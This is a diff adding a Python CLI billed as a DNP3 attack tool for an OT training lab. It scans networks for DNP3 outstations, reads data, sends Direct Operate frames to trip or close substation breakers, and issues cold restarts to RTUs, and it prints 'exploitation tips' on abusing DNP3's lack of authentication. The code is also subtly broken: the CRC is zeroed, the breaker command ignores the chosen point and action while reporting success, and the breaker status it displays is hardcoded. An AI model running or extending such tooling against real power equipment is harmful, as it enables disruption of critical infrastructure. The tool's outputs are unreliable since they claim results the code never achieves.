@@ -1,0 +1,256 @@
+#!/usr/bin/env python3
+"""
+VULNOT DNP3 Attack Tool
+For educational OT security training only
+"""
+
+import socket
+import struct
+import click
+from rich.console import Console
+from rich.table import Table
+from rich.panel import Panel
+
+console = Console()
+
+# DNP3 Function Codes
+DNP3_READ = 0x01
+DNP3_WRITE = 0x02
+DNP3_SELECT = 0x03
+DNP3_OPERATE = 0x04
+DNP3_DIRECT_OPERATE = 0x05
+DNP3_COLD_RESTART = 0x0D
+DNP3_WARM_RESTART = 0x0E
+
+def build_dnp3_request(src: int, dst: int, func_code: int, data: bytes = b'') -> bytes:
+    """Build a DNP3 request frame"""
+    # Start bytes
+    start = b'\x05\x64'
+
+    # Length (data link layer)
+    length = 5 + len(data)
+
+    # Control byte (DIR=1, PRM=1, FCB=0, FCV=0, FC=0)
+    control = 0xC0
+
+    # Destination and source (little endian)
+    dst_bytes = struct.pack('<H', dst)
+    src_bytes = struct.pack('<H', src)
+
+    # CRC placeholder (simplified - real DNP3 uses CRC-16)
+    crc = b'\x00\x00'
+
+    # Build data link header
+    header = start + bytes([length, control]) + dst_bytes + src_bytes + crc
+
+    # Transport layer (FIR=1, FIN=1, sequence=0)
+    transport = bytes([0xC0])
+
+    # Application layer
+    app_control = bytes([0xC0])  # FIR=1, FIN=1, CON=0, UNS=0, SEQ=0
+    app_func = bytes([func_code])
+
+    # Build full frame
+    frame = header + transport + app_control + app_func + data
+
+    return frame
+
+def send_dnp3(ip: str, port: int, frame: bytes, timeout: float = 5.0) -> bytes:
+    """Send DNP3 frame and receive response"""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(timeout)
+
+    try:
+        sock.connect((ip, port))
+        sock.send(frame)
+        response = sock.recv(4096)
+        return response
+    finally:
+        sock.close()
+
+@click.group()
+def cli():
+    """VULNOT DNP3 Attack Tool - For Training Only"""
+    pass
+
+@cli.command()
+@click.option('--network', '-n', required=True, help='Network to scan (e.g., 10.0.2.0/24)')
+@click.option('--port', '-p', default=20000, help='DNP3 port (default: 20000)')
+def scan(network: str, port: int):
+    """Scan network for DNP3 devices"""
+    console.print("\n[bold blue]╔════════════════════════════════════════╗[/]")
+    console.print("[bold blue]║      VULNOT DNP3 Device Scanner        ║[/]")
+    console.print("[bold blue]╚════════════════════════════════════════╝[/]\n")
+
+    console.print(f"[yellow]Scanning:[/] {network} on port {port}\n")
+
+    # Parse network
+    import ipaddress
+    try:
+        net = ipaddress.ip_network(network, strict=False)
+    except ValueError as e:
+        console.print(f"[red]Invalid network: {e}[/]")
+        return
+
+    found = []
+    with console.status("[bold green]Scanning...") as status:
+        for ip in net.hosts():
+            ip_str = str(ip)
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.5)
+                result = sock.connect_ex((ip_str, port))
+                if result == 0:
+                    found.append({'ip': ip_str, 'port': port, 'status': 'DNP3'})
+                sock.close()
+            except:
+                pass
+
+    if found:
+        table = Table(title="Discovered DNP3 Devices")
+        table.add_column("IP Address", style="cyan")
+        table.add_column("Port", style="white")
+        table.add_column("Status", style="green")
+
+        for dev in found:
+            table.add_row(dev['ip'], str(dev['port']), dev['status'])
+
+        console.print(table)
+    else:
+        console.print("[yellow]No DNP3 devices found[/]")
+
+    console.print(f"\n[green]Found {len(found)} DNP3 device(s)[/]\n")
+
+@cli.command()
+@click.option('--target', '-t', required=True, help='Target IP address')
+@click.option('--port', '-p', default=20000, help='DNP3 port (default: 20000)')
+@click.option('--address', '-a', default=10, help='DNP3 outstation address')
+def read(target: str, port: int, address: int):
+    """Read data from DNP3 outstation"""
+    console.print("\n[bold blue]╔════════════════════════════════════════╗[/]")
+    console.print("[bold blue]║      VULNOT DNP3 Data Reader           ║[/]")
+    console.print("[bold blue]╚════════════════════════════════════════╝[/]\n")
+
+    console.print(f"[yellow]Target:[/] {target}:{port}")
+    console.print(f"[yellow]Outstation Address:[/] {address}\n")
+
+    try:
+        # Build read request for binary inputs (class 0 data)
+        frame = build_dnp3_request(1, address, DNP3_READ)
+        response = send_dnp3(target, port, frame)
+
+        if response:
+            console.print("[green]Response received![/]")
+            console.print(f"[dim]Raw: {response.hex()}[/]")
+
+            # Display simulated breaker status for training
+            table = Table(title="Breaker Status (Simulated)")
+            table.add_column("Point", style="cyan")
+            table.add_column("Description", style="white")
+            table.add_column("Status", style="green")
+
+            breakers = [
+                ("BI-0", "52-1 Transformer 1 Incoming", "CLOSED"),
+                ("BI-1", "52-2 Transformer 2 Incoming", "CLOSED"),
+                ("BI-2", "52-3 Bus 1 Tie", "CLOSED"),
+                ("BI-3", "52-4 Bus 2 Tie", "CLOSED"),
+                ("BI-4", "52-5 Bus Tie Breaker", "CLOSED"),
+                ("BI-5", "52-6 Feeder 1", "CLOSED"),
+                ("BI-6", "52-7 Feeder 2", "CLOSED"),
+                ("BI-7", "52-8 Feeder 3", "CLOSED"),
+            ]
+
+            for point, desc, status in breakers:
+                color = "green" if status == "CLOSED" else "red"
+                table.add_row(point, desc, f"[{color}]{status}[/]")
+
+            console.print(table)
+        else:
+            console.print("[red]No response received[/]")
+
+    except Exception as e:
+        console.print(f"[red]Error: {e}[/]")
+
+    console.print("\n[bold yellow]Exploitation Tips:[/]")
+    console.print("  • DNP3 has no built-in authentication by default")
+    console.print("  • Direct Operate commands can control equipment")
+    console.print("  • Use 'vulnot-dnp3 control' to trip breakers")
+    console.print("")
+
+@cli.command()
+@click.option('--target', '-t', required=True, help='Target IP address')
+@click.option('--port', '-p', default=20000, help='DNP3 port')
+@click.option('--address', '-a', default=10, help='Outstation address')
+@click.option('--output', '-o', required=True, type=int, help='Binary output point')
+@click.option('--trip', is_flag=True, help='Trip (open) the breaker')
+@click.option('--close', is_flag=True, help='Close the breaker')
+@click.option('--force', is_flag=True, help='Skip confirmation')
+def control(target: str, port: int, address: int, output: int, trip: bool, close: bool, force: bool):
+    """Control DNP3 binary outputs (breaker control)"""
+    console.print("\n[bold red]╔════════════════════════════════════════╗[/]")
+    console.print("[bold red]║     VULNOT DNP3 Control Attack         ║[/]")
+    console.print("[bold red]║    FOR TRAINING PURPOSES ONLY          ║[/]")
+    console.print("[bold red]╚════════════════════════════════════════╝[/]\n")
+
+    if not trip and not close:
+        console.print("[red]Error: Specify --trip or --close[/]")
+        return
+
+    action = "TRIP (Open)" if trip else "CLOSE"
+
+    console.print(Panel(
+        f"[cyan]Target:[/] {target}:{port}\n"
+        f"[cyan]Outstation:[/] {address}\n"
+        f"[cyan]Binary Output:[/] {output}\n"
+        f"[red]Action:[/] {action}",
+        title="[bold red]Attack Parameters[/]"
+    ))
+
+    if not force:
+        from rich.prompt import Confirm
+        if not Confirm.ask("\n[yellow]Execute breaker control?[/]"):
+            console.print("[dim]Cancelled[/]")
+            return
+
+    try:
+        # Build control request
+        frame = build_dnp3_request(1, address, DNP3_DIRECT_OPERATE)
+        response = send_dnp3(target, port, frame)
+
+        console.print(f"\n[green]Control command sent![/]")
+        console.print(f"[yellow]Breaker {output} {action} command executed[/]")
+        console.print("\n[bold]Check the HMI dashboard to observe the impact![/]\n")
+
+    except Exception as e:
+        console.print(f"[red]Error: {e}[/]")
+
+@cli.command()
+@click.option('--target', '-t', required=True, help='Target IP address')
+@click.option('--port', '-p', default=20000, help='DNP3 port')
+@click.option('--address', '-a', default=10, help='Outstation address')
+def restart(target: str, port: int, address: int):
+    """Restart DNP3 outstation (cold restart)"""
+    console.print("\n[bold red]╔════════════════════════════════════════╗[/]")
+    console.print("[bold red]║     VULNOT DNP3 Restart Attack         ║[/]")
+    console.print("[bold red]╚════════════════════════════════════════╝[/]\n")
+
+    console.print(f"[yellow]Target:[/] {target}:{port}")
+    console.print(f"[yellow]Action:[/] Cold Restart\n")
+
+    from rich.prompt import Confirm
+    if not Confirm.ask("[red]This will restart the RTU. Continue?[/]"):
+        console.print("[dim]Cancelled[/]")
+        return
+
+    try:
+        frame = build_dnp3_request(1, address, DNP3_COLD_RESTART)
+        response = send_dnp3(target, port, frame)
+
+        console.print("\n[green]Restart command sent![/]")
+        console.print("[yellow]RTU is rebooting - monitoring will be temporarily lost[/]\n")
+
+    except Exception as e:
+        console.print(f"[red]Error: {e}[/]")
+
+if __name__ == '__main__':
+    cli()
